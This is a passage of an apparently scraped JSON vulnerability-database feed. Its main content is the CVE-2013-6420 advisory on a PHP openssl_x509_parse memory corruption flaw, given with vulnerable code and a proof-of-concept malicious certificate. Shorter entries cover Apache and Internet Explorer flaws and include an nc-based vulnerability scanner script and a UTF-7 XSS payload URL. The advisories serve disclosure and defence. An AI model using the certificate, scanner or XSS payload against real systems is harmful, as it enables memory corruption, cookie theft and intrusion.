b3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT\r\n  ZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G\r\n  A1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz\r\n  dGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB\r\n  DwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu\r\n  wEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh\r\n  0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8\r\n  pkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6\r\n  SMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX\r\n  1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw\r\n  EQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF\r\n  BQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD\r\n  8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl\r\n  VArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7\r\n  lW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319\r\n  o0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg\r\n  Zsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==\r\n  -----END CERTIFICATE-----\r\n\r\n\r\nDisclosure Timeline: \r\n\r\n  01. December 2013 - Notified security@php.net\r\n                      Provided description, POC cert, demo\r\n                      valgrind output and patch\r\n  02. December 2013 - security@php.net acknowledges and\r\n                      says thank you for report and patch\r\n  02. December 2013 - security@php.net announces that planned\r\n                      release date is 12th December\r\n  03. December 2013 - Notification from RedHat Security that\r\n                      CVE-2013-6420 was assigned to this issue\r\n  09. December 2013 - RedHat Security tells php.net that they\r\n                      should commit the fix silently and add\r\n                      info about it only after release\r\n                      They further tell php.net to tell us to\r\n                      not discuss the vulnerability in public\r\n                      prior to patches being available\r\n  10. December 2013 - security@php.net fixes the vulnerability\r\n                      openly and does not attempt to hide that\r\n                      the commit is a security fix as RedHat\r\n                      Security suggested\r\n  11. December 2013 - RedHat Security Announces that they now\r\n                      consider this vulnerability public and\r\n                      sends out their own patches with big\r\n                      announcement one day before php.net is\r\n                      ready to release their own fixes\r\n  12. December 2013 - security@php.net pushes PHP updates to\r\n                      the PHP 5.3, PHP 5.3 and PHP 5.5 branches\r\n                      to the mirros as was previously agreed upon\r\n  13. December 2013 - New PHP releases are announce on php.net\r\n  13. December 2013 - Public Disclosure of this advisory\r\n\r\n\r\nRecommendation:\r\n\r\n  It is recommended to upgrade to the latest version of PHP\r\n  which also fixes additional non security problems reported\r\n  by third parties.\r\n\r\n  Grab your copy at:\r\n  http://www.php.net/get/php-5.5.7.tar.bz2/from/a/mirror\r\n\r\n\r\nCVE Information:\r\n\r\n  The Common Vulnerabilities and Exposures project (cve.mitre.org) has\r\n  assigned the name CVE-2013-6420 to this vulnerability.\r\n\r\n\r\nGPG-Key:\r\n\r\n  pub   4096R/D6A3FE46 2013-11-06 Stefan Esser\r\n  Key fingerprint = 0A04 AB88 90D2 E67C 3D3D  86E1 AA39 B97F D6A3 FE46\r\n\r\n\r\nCopyright 2013 SektionEins GmbH. All rights reserved.",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:30395"
        },
        {
            "bulletinFamily": "exploit",
            "description": "The PHP function openssl_x509_parse() uses a helper function called asn1_time_to_time_t() to convert timestamps from ASN1 string format into integer timestamp values. The parser within this helper function is not binary safe and can therefore be tricked to write up to five NUL bytes outside of an allocated buffer. This problem can be triggered by x509 certificates that contain NUL bytes in their notBefore and notAfter timestamp fields and leads to a memory corruption that might result in arbitrary code execution.",
            "modified": "2013-12-16T00:00:00",
            "published": "2013-12-16T00:00:00",
            "id": "1337DAY-ID-21682",
            "href": "https://0day.today/exploit/description/21682",
            "type": "zdt",
            "title": "PHP openssl_x509_parse() Memory Corruption Vulnerability",
            "sourceData": "Advisory: PHP openssl_x509_parse() Memory Corruption Vulnerability\r\n Release Date: 2013/12/13\r\nLast Modified: 2013/12/13\r\n       Author: Stefan Esser [stefan.esser[at]sektioneins.de]\r\n\r\n  Application: PHP 4.0.6 - PHP 4.4.9\r\n               PHP 5.0.x\r\n               PHP 5.1.x\r\n               PHP 5.2.x\r\n               PHP 5.3.0 - PHP 5.3.27\r\n               PHP 5.4.0 - PHP 5.4.22\r\n               PHP 5.5.0 - PHP 5.5.6\r\n     Severity: PHP applications using openssl_x509_parse() to parse a\r\n               malicious x509 certificate might trigger a memory\r\n               corruption that might result in arbitrary code execution\r\n         Risk: Critical\r\nVendor Status: Vendor has released PHP 5.5.7, PHP 5.4.23 and PHP 5.3.28\r\n               that contain a fix for this vulnerability\r\n    Reference:\r\nhttp://www.sektioneins.de/advisories/advisory-012013-php-openssl_x509_parse-memory-corruption-vulnerability.html\r\n\r\nOverview:\r\n\r\n  Quote from http://www.php.net\r\n  \"PHP is a widely-used general-purpose scripting language that\r\n   is especially suited for Web development and can be embedded\r\n   into HTML.\"\r\n\r\n  The PHP function openssl_x509_parse() uses a helper function\r\n  called asn1_time_to_time_t() to convert timestamps from ASN1\r\n  string format into integer timestamp values. The parser within\r\n  this helper function is not binary safe and can therefore be\r\n  tricked to write up to five NUL bytes outside of an allocated\r\n  buffer.\r\n \r\n  This problem can be triggered by x509 certificates that contain\r\n  NUL bytes in their notBefore and notAfter timestamp fields and\r\n  leads to a memory corruption that might result in arbitrary\r\n  code execution.\r\n \r\n  Depending on how openssl_x509_parse() is used within a PHP\r\n  application the attack requires either a malicious cert signed\r\n  by a compromised/malicious CA or can be carried out with a\r\n  self-signed cert.\r\n\r\nDetails:\r\n\r\n  The PHP function openssl_x509_parse() is used by PHP applications\r\n  to parse additional information out of x509 certificates, usually\r\n  to harden SSL encrypted communication channels against MITM\r\n  attacks. In the wild we have seen the following use cases for this\r\n  function:\r\n \r\n   * output certificate debugging information\r\n     (e.g. cacert.org/analyse.php)\r\n   * webmail application with SMIME support\r\n   * client certificate handling\r\n   * certificate pinning\r\n   * verification of other certificate properties\r\n     (e.g. a default Wordpress install if ext/curl is not loaded)\r\n     \r\n  When we backported security fixes for some previous security\r\n  vulnerabilities in PHP's openssl to PHP 4.4.9 as part of our\r\n  PHP security backport services that we provide to customers,\r\n  we performed a quick audit of openssl_x509_parse() and all the\r\n  functions it calls, which led to the discovery of a memory\r\n  corruption vulnerability.\r\n \r\n  Within the function openssl_x509_parse() the helper function\r\n  asn1_time_to_time_t() is called two times to parse the\r\n  notBefore and notAfter ASN1 string timestamps from the cert\r\n  into integer time_t values as you can see below:\r\n \r\n     add_assoc_long(return_value, \"validFrom_time_t\",\r\nasn1_time_to_time_t(X509_get_notBefore(cert) TSRMLS_CC));\r\n     add_assoc_long(return_value, \"validTo_time_t\",\r\nasn1_time_to_time_t(X509_get_notAfter(cert) TSRMLS_CC));\r\n \r\n  When you take a look into this helper function you will see\r\n  that it only contains a quickly hacked parser that was never\r\n  really improved since its introduction in PHP 4.0.6. The author\r\n  of this parser was even aware of its hackishness as you can see\r\n  from the error message contained in the code:\r\n \r\n  static time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*\r\n{{{ */\r\n  {\r\n  /*\r\n     This is how the time string is formatted:\r\n     snprintf(p, sizeof(p), \"%02d%02d%02d%02d%02d%02dZ\",ts->tm_year%100,\r\n        ts->tm_mon+1,ts->tm_mday,ts->tm_hour,ts->tm_min,ts->tm_sec);\r\n  */\r\n\r\n     time_t ret;\r\n     struct tm thetime;\r\n     char * strbuf;\r\n     char * thestr;\r\n     long gmadjust = 0;\r\n\r\n     if (timestr->length < 13) {\r\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, \"extension author\r\ntoo lazy to parse %s correctly\", timestr->data);\r\n        return (time_t)-1;\r\n     }\r\n\r\n However the actual problem of the code should become obvious when\r\n you read the rest of the parsing code that attempts to first\r\n duplicate the timestamp string and then parses the timestamp by\r\n going through the copy in reverse order and writing five NUL bytes\r\n into the duplicated string.\r\n\r\n     strbuf = estrdup((char *)timestr->data);\r\n\r\n     memset(&thetime, 0, sizeof(thetime));\r\n\r\n     /* we work backwards so that we can use atoi more easily */\r\n\r\n     thestr = strbuf + timestr->length - 3;\r\n\r\n     thetime.tm_sec = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_min = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_hour = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mday = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mon = atoi(thestr)-1;\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_year = atoi(thestr);\r\n\r\n  The problem with this code is that ASN1 strings can contain NUL\r\n  bytes, while the parser is not binary safe. This means if a\r\n  timestamp string inside a x509 certificate contains a NUL byte\r\n  at e.g. position 13 the estrdup() will only allocate 14 bytes\r\n  for a copy of the string, but the parser will attempt to write\r\n  five NUL bytes to memory addressed by the ASN1 length of the\r\n  string. If the real string length is longer than 16 bytes this\r\n  will result in writes of NUL bytes outside of the allocated\r\n  buffer.\r\n \r\n  Because of PHP's deterministic heap memory layout that can be\r\n  controlled a lot by sending e.g. POST variables and using\r\n  duplicate variable names to poke memory holes this vulnerability\r\n  must be considered exploitable. However the actual exploit will\r\n  depend a lot on how the PHP application uses openssl_x509_parse()\r\n  and a lot of other factors.\r\n\r\n  Depending on which of the actual use cases the function is used\r\n  for by an application, an attacker can trigger the memory\r\n  corruption with a self-signed certificate. An example for this\r\n  is the public analyse.php x509 cert debugging script provided\r\n  by CACert on their webserver.\r\n \r\n  Other applications like Wordpress use openssl_x509_parse() to\r\n  further verify SSL certificates whenever Wordpress connects to\r\n  a HTTPS URL (in case ext/curl is not loaded which is the default\r\n  for several linux distributions). Because the parsing only\r\n  happens after the initial SSL connection is established this\r\n  can only be abused by attackers controlling a malicious trusted\r\n  cert. However recent disclosures of alleged NSA capabilities,\r\n  the French incident and disclosures about fully compromised\r\n  trusted CAs in the past years have shown that this capability\r\n  might be in the reach of malicious attackers.\n\n#  0day.today [2018-02-06]  #",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-21682"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2013-12-15T00:00:00",
            "published": "2013-12-15T00:00:00",
            "href": "https://packetstormsecurity.com/files/124436/PHP-openssl_x509_parse-Memory-Corruption.html",
            "id": "PACKETSTORM:124436",
            "type": "packetstorm",
            "title": "PHP openssl_x509_parse() Memory Corruption",
            "sourceData": "`  \nSektionEins GmbH  \nwww.sektioneins.de  \n  \n-= Security Advisory =-  \n  \nAdvisory: PHP openssl_x509_parse() Memory Corruption Vulnerability  \nRelease Date: 2013/12/13  \nLast Modified: 2013/12/13  \nAuthor: Stefan Esser [stefan.esser[at]sektioneins.de]  \n  \nApplication: PHP 4.0.6 - PHP 4.4.9  \nPHP 5.0.x  \nPHP 5.1.x  \nPHP 5.2.x  \nPHP 5.3.0 - PHP 5.3.27  \nPHP 5.4.0 - PHP 5.4.22  \nPHP 5.5.0 - PHP 5.5.6  \nSeverity: PHP applications using openssl_x509_parse() to parse a  \nmalicious x509 certificate might trigger a memory  \ncorruption that might result in arbitrary code execution  \nRisk: Critical  \nVendor Status: Vendor has released PHP 5.5.7, PHP 5.4.23 and PHP 5.3.28  \nthat contain a fix for this vulnerability  \nReference:  \nhttp://www.sektioneins.de/advisories/advisory-012013-php-openssl_x509_parse-memory-corruption-vulnerability.html  \n  \nOverview:  \n  \nQuote from http://www.php.net  \n\"PHP is a widely-used general-purpose scripting language that  \nis especially suited for Web development and can be embedded  \ninto HTML.\"  \n  \nThe PHP function openssl_x509_parse() uses a helper function  \ncalled asn1_time_to_time_t() to convert timestamps from ASN1  \nstring format into integer timestamp values. The parser within  \nthis helper function is not binary safe and can therefore be  \ntricked to write up to five NUL bytes outside of an allocated  \nbuffer.  \n  \nThis problem can be triggered by x509 certificates that contain  \nNUL bytes in their notBefore and notAfter timestamp fields and  \nleads to a memory corruption that might result in arbitrary  \ncode execution.  \n  \nDepending on how openssl_x509_parse() is used within a PHP  \napplication the attack requires either a malicious cert signed  \nby a compromised/malicious CA or can be carried out with a  \nself-signed cert.  \n  \nDetails:  \n  \nThe PHP function openssl_x509_parse() is used by PHP applications  \nto parse additional information out of x509 certificates, usually  \nto harden SSL encrypted communication channels against MITM  \nattacks. In the wild we have seen the following use cases for this  \nfunction:  \n  \n* output certificate debugging information  \n(e.g. cacert.org/analyse.php)  \n* webmail application with SMIME support  \n* client certificate handling  \n* certificate pinning  \n* verification of other certificate properties  \n(e.g. a default Wordpress install if ext/curl is not loaded)  \n  \nWhen we backported security fixes for some previous security  \nvulnerabilities in PHP's openssl to PHP 4.4.9 as part of our  \nPHP security backport services that we provide to customers,  \nwe performed a quick audit of openssl_x509_parse() and all the  \nfunctions it calls, which led to the discovery of a memory  \ncorruption vulnerability.  \n  \nWithin the function openssl_x509_parse() the helper function  \nasn1_time_to_time_t() is called two times to parse the  \nnotBefore and notAfter ASN1 string timestamps from the cert  \ninto integer time_t values as you can see below:  \n  \nadd_assoc_long(return_value, \"validFrom_time_t\",  \nasn1_time_to_time_t(X509_get_notBefore(cert) TSRMLS_CC));  \nadd_assoc_long(return_value, \"validTo_time_t\",  \nasn1_time_to_time_t(X509_get_notAfter(cert) TSRMLS_CC));  \n  \nWhen you take a look into this helper function you will see  \nthat it only contains a quickly hacked parser that was never  \nreally improved since its introduction in PHP 4.0.6. The author  \nof this parser was even aware of its hackishness as you can see  \nfrom the error message contained in the code:  \n  \nstatic time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*  \n{{{ */  \n{  \n/*  \nThis is how the time string is formatted:  \nsnprintf(p, sizeof(p), \"%02d%02d%02d%02d%02d%02dZ\",ts->tm_year%100,  \nts->tm_mon+1,ts->tm_mday,ts->tm_hour,ts->tm_min,ts->tm_sec);  \n*/  \n  \ntime_t ret;  \nstruct tm thetime;  \nchar * strbuf;  \nchar * thestr;  \nlong gmadjust = 0;  \n  \nif (timestr->length < 13) {  \nphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"extension author  \ntoo lazy to parse %s correctly\", timestr->data);  \nreturn (time_t)-1;  \n}  \n  \nHowever the actual problem of the code should become obvious when  \nyou read the rest of the parsing code that attempts to first  \nduplicate the timestamp string and then parses the timestamp by  \ngoing through the copy in reverse order and writing five NUL bytes  \ninto the duplicated string.  \n  \nstrbuf = estrdup((char *)timestr->data);  \n  \nmemset(&thetime, 0, sizeof(thetime));  \n  \n/* we work backwards so that we can use atoi more easily */  \n  \nthestr = strbuf + timestr->length - 3;  \n  \nthetime.tm_sec = atoi(thestr);  \n*thestr = '\\0';  \nthestr -= 2;  \nthetime.tm_min = atoi(thestr);  \n*thestr = '\\0';  \nthestr -= 2;  \nthetime.tm_hour = atoi(thestr);  \n*thestr = '\\0';  \nthestr -= 2;  \nthetime.tm_mday = atoi(thestr);  \n*thestr = '\\0';  \nthestr -= 2;  \nthetime.tm_mon = atoi(thestr)-1;  \n*thestr = '\\0';  \nthestr -= 2;  \nthetime.tm_year = atoi(thestr);  \n  \nThe problem with this code is that ASN1 strings can contain NUL  \nbytes, while the parser is not binary safe. This means if a  \ntimestamp string inside a x509 certificate contains a NUL byte  \nat e.g. position 13 the estrdup() will only allocate 14 bytes  \nfor a copy of the string, but the parser will attempt to write  \nfive NUL bytes to memory addressed by the ASN1 length of the  \nstring. If the real string length is longer than 16 bytes this  \nwill result in writes of NUL bytes outside of the allocated  \nbuffer.  \n  \nBecause of PHP's deterministic heap memory layout that can be  \ncontrolled a lot by sending e.g. POST variables and using  \nduplicate variable names to poke memory holes this vulnerability  \nmust be considered exploitable. However the actual exploit will  \ndepend a lot on how the PHP application uses openssl_x509_parse()  \nand a lot of other factors.  \n  \nDepending on which of the actual use cases the function is used  \nfor by an application, an attacker can trigger the memory  \ncorruption with a self-signed certificate. An example for this  \nis the public analyse.php x509 cert debugging script provided  \nby CACert on their webserver.  \n  \nOther applications like Wordpress use openssl_x509_parse() to  \nfurther verify SSL certificates whenever Wordpress connects to  \na HTTPS URL (in case ext/curl is not loaded which is the default  \nfor several linux distributions). Because the parsing only  \nhappens after the initial SSL connection is established this  \ncan only be abused by attackers controlling a malicious trusted  \ncert. However recent disclosures of alleged NSA capabilities,  \nthe French incident and disclosures about fully compromised  \ntrusted CAs in the past years have shown that this capability  \nmight be in the reach of malicious attackers.  \n  \n  \nProof of Concept:  \n  \nThe following x509 certificate demonstrates the out of bounds write:  \n  \n-----BEGIN CERTIFICATE-----  \nMIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD  \nVQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH  \nS8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91  \ncyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k  \nZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY  \nZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  \nAAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO  \nb3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT  \nZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G  \nA1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz  \ndGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB  \nDwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu  \nwEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh  \n0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8  \npkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6  \nSMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX  \n1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw  \nEQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF  \nBQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD  \n8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl  \nVArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7  \nlW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319  \no0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg  \nZsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==  \n-----END CERTIFICATE-----  \n  \n  \nDisclosure Timeline:   \n  \n01. December 2013 - Notified security@php.net  \nProvided description, POC cert, demo  \nvalgrind output and patch  \n02. December 2013 - security@php.net acknowledges and  \nsays thank you for report and patch  \n02. December 2013 - security@php.net announces that planned  \nrelease date is 12th December  \n03. December 2013 - Notification from RedHat Security that  \nCVE-2013-6420 was assigned to this issue  \n09. December 2013 - RedHat Security tells php.net that they  \nshould commit the fix silently and add  \ninfo about it only after release  \nThey further tell php.net to tell us to  \nnot discuss the vulnerability in public  \nprior to patches being available  \n10. December 2013 - security@php.net fixes the vulnerability  \nopenly and does not attempt to hide that  \nthe commit is a security fix as RedHat  \nSecurity suggested  \n11. December 2013 - RedHat Security Announces that they now  \nconsider this vulnerability public and  \nsends out their own patches with big  \nannouncement one day before php.net is  \nready to release their own fixes  \n12. December 2013 - security@php.net pushes PHP updates to  \nthe PHP 5.3, PHP 5.3 and PHP 5.5 branches  \nto the mirros as was previously agreed upon  \n13. December 2013 - New PHP releases are announce on php.net  \n13. December 2013 - Public Disclosure of this advisory  \n  \n  \nRecommendation:  \n  \nIt is recommended to upgrade to the latest version of PHP  \nwhich also fixes additional non security problems reported  \nby third parties.  \n  \nGrab your copy at:  \nhttp://www.php.net/get/php-5.5.7.tar.bz2/from/a/mirror  \n  \n  \nCVE Information:  \n  \nThe Common Vulnerabilities and Exposures project (cve.mitre.org) has  \nassigned the name CVE-2013-6420 to this vulnerability.  \n  \n  \nGPG-Key:  \n  \npub 4096R/D6A3FE46 2013-11-06 Stefan Esser  \nKey fingerprint = 0A04 AB88 90D2 E67C 3D3D 86E1 AA39 B97F D6A3 FE46  \n  \n  \nCopyright 2013 SektionEins GmbH. All rights reserved.  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:124436"
        }
    ],
    "CVE-2006-4110": [
        {
            "bulletinFamily": "exploit",
            "description": "Apache 2.2.2 CGI Script Source Code Information Disclosure Vulnerability. CVE-2006-4110. Remote exploits for multiple platform",
            "modified": "2006-08-09T00:00:00",
            "published": "2006-08-09T00:00:00",
            "id": "EDB-ID:28365",
            "href": "https://www.exploit-db.com/exploits/28365/",
            "type": "exploitdb",
            "title": "Apache 2.2.2 CGI Script Source Code Information Disclosure Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/19447/info\r\n\r\nApache is prone to an information-disclosure vulnerability because it fails to properly handle exceptional conditions.\r\n\r\nAn attacker can exploit this issue to retrieve script source code. Information obtained may aid in further attacks.\r\n\r\nVersions 2.2.2 for Microsoft Windows is vulnerable to this issue; other versions may also be affected.\r\n\r\nhttp://www.example.com/CGI-BIN/foo",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:28365"
        }
    ],
    "CVE-2007-6203": [
        {
            "bulletinFamily": "exploit",
            "description": "Apache HTTP Server 2.2.4 413 Error HTTP Request Method Cross-Site Scripting Weakness. CVE-2007-6203 . Remote exploit for unix platform",
            "modified": "2007-11-30T00:00:00",
            "published": "2007-11-30T00:00:00",
            "id": "EDB-ID:30835",
            "href": "https://www.exploit-db.com/exploits/30835/",
            "type": "exploitdb",
            "title": "Apache HTTP Server <= 2.2.4 413 Error HTTP Request Method Cross-Site Scripting Weakness",
            "sourceData": "source: http://www.securityfocus.com/bid/26663/info\r\n\r\nApache is prone to a cross-site scripting weakness when handling HTTP request methods that result in 413 HTTP errors.\r\n\r\nAn attacker may exploit this issue to steal cookie-based authentication credentials and launch other attacks.\r\n\r\nApache 2.0.46 through 2.2.4 are vulnerable; other versions may also be affected. \r\n\r\n#!/bin/bash\r\n# PR07-37-scan\r\nif [ $# -ne 1 ]\r\nthen\r\n       echo \"$0 <hosts-file>\"\r\n       exit\r\nfi\r\n\r\nfor i in `cat $1`\r\ndo\r\n\r\nif echo -en \"<PROCHECKUP> / HTTP/1.1\\nHost: $i\\nConnection: \r\nclose\\nContent-length: 0\\nContent-length: 0\\n\\n\" | nc -w 4 $i 80 | grep \r\n-i '<PROCHECKUP>' > /dev/null\r\nthen\r\n       echo \"$i is VULNERABLE!\"\r\nfi\r\n\r\ndone \r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:30835"
        }
    ],
    "CVE-2008-2168": [
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft Internet Explorer 2.0 UTF-7 HTTP Response Handling Weakness. CVE-2008-2168. Remote exploit for windows platform",
            "modified": "2008-05-08T00:00:00",
            "published": "2008-05-08T00:00:00",
            "id": "EDB-ID:31759",
            "href": "https://www.exploit-db.com/exploits/31759/",
            "type": "exploitdb",
            "title": "Microsoft Internet Explorer 2.0 - UTF-7 HTTP Response Handling Weakness",
            "sourceData": "source: http://www.securityfocus.com/bid/29112/info\r\n\r\nMicrosoft Internet Explorer is prone to a weakness that can facilitate cross-site scripting attacks. The issue occurs because the application fails to sufficiently sanitize user-supplied input when handling UTF-7 charset data received in HTTP responses.\r\n\r\nAttackers can leverage this weakness to aid in cross-site scripting attacks against unsuspecting users of the application.\r\n\r\nReports indicate that all versions of Internet Explorer are affected.\r\n\r\nOther browsers may also be affected under certain configurations, but this has not been confirmed.\r\n\r\nNOTE: This BID was originally titled 'Apache HTTP Server 403 Error Cross-Site Scripting Vulnerability'.\r\n\r\nhttp://www.example.com/Znl5g3k70ZaBUPYmN5RAGUdkskoprzGI63K4mIj2sqzbX0Kc3Fu7vfthepWhmKvjudPuJTNeK9zw5MaZ1yXJi8RJRRuPe5UahFwOblMXsIPTGh3pVjTLdim3vuTKgdazOG9 idQbIjbnpMEco8Zlo5xNRuCoviPx7x7tYYeOgc8HU46gaecJwnHY7f6GlQB8H6kBFhjoIaHE1SQPhU5VReCz1olPh5jZ%3Cfont%20size=50%3EDEFACED%3C!xc+ADw-script+AD4-alert('xss') +ADw-/script+AD4---//-- ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:31759"
        }
    ],
    "CVE-2013-2110": [
        {
            "bulletinFamily": "exploit",
            "description": "Bugtraq ID:60411\r\nCVE ID:CVE-2013-2110\r\n\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\u3002\r\n&quot;php_quot_print_encode()&quot;\u51fd\u6570(ext/standard/quot_print.c)\u5728\u89e3\u6790\u5b57\u7b26\u4e32\u65f6\u5b58\u5728\u4e00\u4e2a\u57fa\u4e8e\u5806\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5229\u7528\u6b64\u6f0f\u6d1e\u4ee5\u5e94\u7528\u7a0b\u5e8f\u4e0a\u4e0b\u6587\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\r\n\r\n\u6b64\u5916\u5728\u89e3\u6790MP3\u6587\u4ef6\u7684MIMETYPE\u65f6\u5b58\u5728\u4e00\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u53ef\u5bfc\u81f4PHP 5.4.15\u7248\u672c\u5d29\u6e83\u3002\r\n0\r\nPHP 5.3.x\r\nPHP 5.4.x\r\n\u5382\u5546\u89e3\u51b3\u65b9\u6848\r\n\r\nPHP 5.4.16\u62165.3.26\u5df2\u7ecf\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u5efa\u8bae\u7528\u6237\u4e0b\u8f7d\u66f4\u65b0\uff1a\r\nhttp://www.php.net/",
            "modified": "2013-06-11T00:00:00",
            "published": "2013-06-11T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60840",
            "id": "SSV:60840",
            "title": "PHP &quot;php_quot_print_encode()&quot;\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e(CVE-2013-2110)",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60840"
        }
    ],
    "CVE-2011-1468": [
        {
